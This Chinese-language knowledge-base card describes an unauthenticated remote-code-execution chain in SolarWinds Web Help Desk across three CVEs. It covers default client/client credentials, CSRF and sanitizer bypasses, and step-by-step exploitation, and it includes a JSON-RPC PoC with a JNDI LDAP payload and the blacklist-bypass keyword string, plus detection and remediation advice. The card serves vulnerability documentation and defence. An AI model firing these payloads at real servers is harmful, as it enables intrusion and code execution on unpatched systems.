---
id: web-java-deserialization-jndi-solarwinds-whd-ajaxproxy-rpc-rce
title: SolarWinds Web Help Desk AjaxProxy JSON-RPC 未授权调用导致 JNDI 注入 RCE（CVE-2025-40551 链）
type: scenario
domain: web
path: web/java/deserialization/jndi
technique: solarwinds-whd-ajaxproxy-jsonrpc-jndi-rce
tags:
- java
- solarwinds
- web-help-desk
- json-rpc
- jndi
- deserialization
- auth-bypass
- csrf
- rce
- cve-2025-40551
cve:
- CVE-2025-40551
- CVE-2025-40536
- CVE-2025-40537
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: SolarWinds Web Help Desk < 2026.1（原文：已在 WHD 2026.1 修复）
verification:
  verified_by: verifier-V31
  verified_at: '2026-11-05T06:04:35+08:00'
  notes: 已对照原文与图01-05核对：图01 checkCsrfTokenWo 仅当 URI 不含 /ajax/ 且方法为 GET 才做参数白名单校验，badparam=/ajax/ 可整体跳过；图02 AjaxProxy.handleRequest 将 proxy 按 proxyName 注册进 JSONBridge 后直接 call 用户 JSON，无方法/类限制；图03 checkSuspeciousPayLoad 命中黑名单后当 matchedKeyword 以 java. 开头且 isWhitelisted 为真则放行；图04 isWhitelisted 要求 payload 同时包含 parentpopup/wonoselectionstring/dummy/mdssubmitlink/mdsform__enterkeypressed/mdsform__shiftkeypressed/mdsform__altkeypressed/_csrf 共8词；图05 给出 静态凭证或无凭证建会话→badparam=/ajax/&wopage=LoginPref→POST 0.7.1.3.1.0.0.0.1.1.0=1&_csrf→获取 AjaxProxy JSON-RPC→wo 路径绕过 sanitizeRequest→8词绕过→wopage.setVariableValueForName+JNDIConnectionPool(jndiPath)→RCE 的完整链路。已把卡内方法名修正为原文拼写 checkSuspeciousPayLoad；CVE-2025-40536/40537/40551 与修复版本 WHD 2026.1 与原文一致。原文无端到端 HTTP 抓包/执行截图，PoC 为 JSON-RPC 结构与链路参数，高版本 JDK trustURLCodebase 依赖已注明；未在本机复现。
url: /docs/web/java/deserialization/jndi/web-java-deserialization-jndi-solarwinds-whd-ajaxproxy-rpc-rce/
draft: false
kb_aliases:
- CVE-2025-40551
- CVE-2025-40536
- CVE-2025-40537
- SolarWinds WHD RCE
- AjaxProxy JSON-RPC
- wopage.setVariableValueForName
- LoginPref AjaxFlexibleFileUpload
---

## 一句话结论

SolarWinds Web Help Desk 的 `AjaxProxy` 组件用 jabsorb JSON-RPC 桥直接执行请求中的 `method`，未限制可调用方法与反序列化类；攻击者先用 `badparam=/ajax/&wopage=LoginPref` 绕过 GET 参数白名单，再经 `LoginPref → AjaxFlexibleFileUpload → AjaxProxy` 进入 JSON-RPC，随后把 URI 中的 `ajax` 换成 `wo` 绕过 `sanitizeRequest`、在请求中拼接 8 个白名单关键词绕过 `checkSuspeciousPayLoad`，最后用 `wopage.setVariableValueForName` 传入 `org.apache.xalan.lib.sql.JNDIConnectionPool` 与 `jndiPath=ldap://...` 触发 JNDI 注入，实现未授权 RCE。

## 原理

- **CVE-2025-40537（静态凭证）**：WHD 初始化时自动创建演示账户 `client`，密码硬编码为 `client` 并经 `DigestCryptoManager.createDefaultAndEncrypt("client")` 加密存储，未强制修改。攻击者可先用该账户建立会话；原文也给出“无凭证创建会话”的另一种入口。
- **CVE-2025-40536（参数白名单绕过）**：`checkCsrfTokenWo()` 只有在 `URI 不含 "/ajax/" 且方法为 GET` 时才校验参数白名单。攻击者在请求中加入 `badparam=/ajax/`，使 URI 字符串包含 `/ajax/`，条件不成立，白名单校验被整体跳过；随后用 `wopage` 参数加载任意 WebObject 组件。
- **CVE-2025-40551（AjaxProxy JSON-RPC 滥用）**：`AjaxProxy.handleRequest` 读取请求体 JSON，创建/获取 `JSONBridge`/`JSONRPCBridge`，把 `proxy` 对象按 `proxyName` 注册后直接 `call` 用户提供的 JSON。`method`、参数类、可反序列化类均无白名单/黑名单限制，jabsorb 会按 JSON 中的 `javaClass` 等字段实例化对象并调用方法。
- **绕过 sanitizeRequest()**：该函数仅当 `request.uri().contains("ajax") && isJSON(payload)` 时才净化请求体。WHD 中 `wo` 与 `ajax` 路径处理逻辑一致，把 URI 里的 `ajax` 改为 `wo`，净化条件不成立，恶意 JSON 原样进入 AjaxProxy。
- **绕过 checkSuspeciousPayLoad()**：该函数用 `SUSPICIOUS_PATTERNS` 匹配危险特征（如 `java.` 类名）；命中后只有 `matchedKeyword.startsWith("java.") && isWhitelisted(payload)` 才放行。`isWhitelisted()` 要求 payload **同时包含全部 8 个**固定字符串：`parentpopup`、`wonoselectionstring`、`dummy`、`mdssubmitlink`、`mdsform__enterkeypressed`、`mdsform__shiftkeypressed`、`mdsform__altkeypressed`、`_csrf`。在请求中加一个包含这 8 个词的 `bypass` 字段，即可让 `javaClass` 命中黑名单后仍被放行。
- **组件链**：`wopage=LoginPref` 实例化 LoginPref；LoginPref 使用 `AjaxFlexibleFileUpload`；后者触发 `AjaxProxy`；AjaxProxy 的 JSON-RPC 调用 `wopage.setVariableValueForName`，把变量值设为带 `jndiPath` 的 `JNDIConnectionPool`，触发 JNDI 查找并加载远程恶意对象/工厂，最终 RCE。
- **为什么 JNDI 能 RCE**：`org.apache.xalan.lib.sql.JNDIConnectionPool` 在初始化/属性设置时会按 `jndiPath` 做 JNDI lookup；若目标 JDK 允许远程 codebase 或 classpath 上存在可利用的本地工厂/gadget，攻击者控制的 LDAP/RMI 服务即可返回恶意对象并执行代码。高版本 JDK 的 `trustURLCodebase=false` 会限制远程类加载，但本地 gadget 链仍可能利用，具体取决于 WHD 自带依赖。

## 触发条件

- 目标为 SolarWinds Web Help Desk < 2026.1，HTTP 服务可访问。
- AjaxProxy/LoginPref 等组件路由可达；WHD 默认配置下无需有效凭据即可创建会话，或可用静态 `client/client` 账户登录。
- 攻击者能控制一个 LDAP/RMI 服务供目标回连，且目标 JDK/classpath 满足 JNDI 利用条件。
- 目标未禁用 jabsorb/AjaxProxy，且未对 `wopage` 组件访问做额外鉴权。
- 请求需通过 CSRF/参数校验（利用 `badparam=/ajax/` 与 8 词白名单拼接绕过）。

## 利用步骤

1. 建立会话：尝试静态账户 `client/client` 登录；或按原文“无凭证创建会话”的方式获取有效会话/CSRF token。
2. 绕过 GET 参数白名单并实例化 LoginPref：发送 `GET ...?badparam=/ajax/&wopage=LoginPref`。
3. 触发 AjaxFlexibleFileUpload：向对应组件发送 `POST`，参数形如 `0.7.1.3.1.0.0.0.1.1.0=1&_csrf=<XSRF-TOKEN>`。
4. 获取 AjaxProxy 的 JSON-RPC 入口（GET 请求，具体路径以实例返回/前端代码为准）。
5. 构造恶意 JSON-RPC 请求：URI 使用 `wo` 路径（不含 `ajax`）绕过 `sanitizeRequest`；请求体加入 `bypass` 字段包含 8 个白名单词；`method` 设为 `wopage.setVariableValueForName`，参数为 `["malicious", {"javaClass":"org.apache.xalan.lib.sql.JNDIConnectionPool","jndiPath":"ldap://attacker/eval"}]`。
6. 在攻击者 LDAP/RMI 服务上准备恶意对象/本地工厂链；目标触发 JNDI lookup 后加载并执行。
7. 验证：DNSLog/回连、命令执行结果或反弹 shell；失败时检查 JDK 版本、trustURLCodebase、classpath gadget 与 WAF。

## PoC

```json
{
  "bypass": "parentpopupwonoselectionstringdummymdssubmitlinkmdsform__enterkeypressedmdsform__shiftkeypressedmdsform__altkeypressed_csrf",
  "id": 1,
  "method": "wopage.setVariableValueForName",
  "params": [
    "malicious",
    {
      "javaClass": "org.apache.xalan.lib.sql.JNDIConnectionPool",
      "jndiPath": "ldap://127.0.0.1/eval"
    }
  ]
}
```

```text
# 前置参数（原文链路示意）
GET  ...?badparam=/ajax/&wopage=LoginPref
POST ...  0.7.1.3.1.0.0.0.1.1.0=1&_csrf=<XSRF-TOKEN>
# 将上述 JSON 作为 AjaxProxy JSON-RPC 请求体；URI 使用 wo 路径以绕过 sanitizeRequest
```

说明：原文未给出完整端到端 HTTP 请求与执行截图，以上为链路参数与 POC 结构；`ldap://127.0.0.1/eval` 需替换为攻击者控制的 LDAP/RMI 服务。

## 变体与关联

- 变体：若不使用静态凭证，可通过无凭证创建会话进入同一链；`client/client` 只是 CVE-2025-40537 提供的便捷入口。
- 变体：`wopage` 可加载的其他 WebObject 组件也可能触达 AjaxProxy/AjaxFlexibleFileUpload，可替换 LoginPref。
- 变体：JSON-RPC 方法不限于 `setVariableValueForName`，其他可设置属性/创建对象的方法也可能作为 sink；JNDI 协议可换 RMI、LDAP、iiop 等。
- 变体：高版本 JDK 下改用本地工厂/gadget（如 Tomcat BeanFactory、C3P0 等）绕过 `trustURLCodebase=false`。
- 关联：[[web-java-deserialization-jndi-log4j2-login-rce]]（JNDI 入口对比）；[[web-java-deserialization-jndi-tomcat-resourcefactory-jdbc-bypass]]、[[web-java-deserialization-jndi-high-version-c3p0-javabeanobjectfactory]]（高版本 JNDI 本地工厂链）；[[web-java-deser-commonscollections-cc1-transformedmap]]（若 JSON-RPC 走原生反序列化时的通用链）。
- 边界：WHD 已升级到 2026.1、AjaxProxy/jabsorb 被移除或加方法/类白名单、JNDI 远程 codebase 与本地工厂链均不可用、或 `wopage` 组件访问要求额外鉴权时，链不成立。

## 检测与防御

- 检测：HTTP 请求中出现 `badparam=/ajax/`、`wopage=LoginPref`、`AjaxFlexibleFileUpload`、`javaClass`、`jndiPath`、`ldap://`/`rmi://` 等特征；同一会话短时间内先 GET 组件再 POST JSON-RPC；WHD 日志出现 `AjaxProxy.handleRequest`/JSON-RPC 异常；目标向外部 LDAP/RMI 端口发起连接。
- 修复：升级到 WHD 2026.1；移除或禁用 AjaxProxy/jabsorb 组件，至少对 `method`、注册对象、可反序列化类做严格白名单；修正 `checkCsrfTokenWo()` 不要用 URI 字符串包含 `/ajax/` 作为跳过条件；修正 `sanitizeRequest()` 不要用 `ajax` 子串判断；移除 `isWhitelisted()` 的“包含全部 8 词即放行”逻辑；所有 WebObject 组件访问强制认证与授权。
- 加固：JVM 设置 `com.sun.jndi.ldap.object.trustURLCodebase=false`、`com.sun.jndi.rmi.object.trustURLCodebase=false` 与 `jdk.serialFilter` 白名单；删除/禁用默认 `client` 账户并强制改密；WAF 拦截 `wopage`/JSON-RPC 可疑请求；限制服务器出站 LDAP/RMI；对 WHD 做版本与组件资产盘点。
